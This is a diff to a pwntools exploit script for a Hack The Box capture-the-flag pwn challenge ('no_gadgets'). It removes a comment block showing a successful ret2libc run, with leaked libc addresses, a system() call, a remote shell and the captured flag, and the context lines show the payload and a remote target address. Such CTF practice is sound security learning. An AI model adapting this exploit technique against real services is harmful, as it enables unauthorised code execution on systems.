@@ -10,6 +10,7 @@ pwn.context.terminal = ["foot"]
 if pwn.args.REMOTE:
     p = pwn.remote("83.136.248.18",51273)
 else:
+    # p = pwn.process(exe.path)
     p = pwn.gdb.debug([exe.path],"""
     # b*0x000000000040122e
     #return 
@@ -120,24 +121,6 @@ if __name__ == "__main__":
     payload += pwn.p64(system_libc)
     input()
     sl(payload)
-# [*] leak libc: 0x7ff0ceb20850
-# [*] libc base: 0x7ff0cea95000
-# [*] bin_sh: 0x7ff0cec6d698
-# [*] system_libc: 0x7ff0ceae5d60
-# [*] pop_rdi: 0x7ff0ceabf3e5
-#
-# [*] Switching to interactive mode
-#
-# $ ls
-# flag.txt
-# ld-2.35.so
-# libc.so.6
-# no_gadgets
-# $ cat flag.txt
-# HTB{wh0_n3eD5_rD1_wH3n_Y0u_h@v3_rBp!!!_92e0eb70ee6d530b2e6a4a8a230dc258}$ 
-# [*] Interrupted
-# [*] Closed connection to 94.237.61.244 port 39654
-
 
 
     # good luck pwning :)
